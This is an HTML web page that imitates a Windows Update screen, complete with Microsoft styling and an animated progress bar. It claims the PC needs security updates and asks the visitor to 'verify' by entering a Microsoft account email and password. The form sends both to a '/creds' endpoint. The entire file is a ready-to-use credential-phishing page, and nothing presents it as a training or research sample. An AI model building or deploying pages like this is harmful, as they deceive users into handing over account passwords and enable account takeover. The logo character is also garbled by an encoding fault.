<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Windows Update</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #000; color: #fff; margin: 0; padding: 0; height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { text-align: center; max-width: 500px; }
        .windows-logo { font-size: 80px; margin-bottom: 30px; }
        h1 { font-size: 24px; font-weight: 300; margin-bottom: 20px; }
        p { color: #999; font-size: 14px; margin-bottom: 30px; }
        .progress { width: 100%; height: 3px; background: #333; border-radius: 3px; overflow: hidden; margin-bottom: 20px; }
        .bar { width: 30%; height: 100%; background: #0078d4; animation: progress 2s ease-in-out infinite; }
        @keyframes progress { 0% { width: 0; } 100% { width: 100%; } }
        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #444; border-radius: 3px; background: #1a1a1a; color: #fff; font-size: 14px; box-sizing: border-box; }
        button { padding: 12px 40px; background: #0078d4; color: #fff; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="windows-logo">âŠž</div>
        <h1>Windows Update</h1>
        <p>Your PC needs to install important security updates. Please verify your identity to continue.</p>
        <form action="/creds" method="POST">
            <input type="text" name="email" placeholder="Microsoft account email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Verify</button>
        </form>
    </div>
</body>
</html>
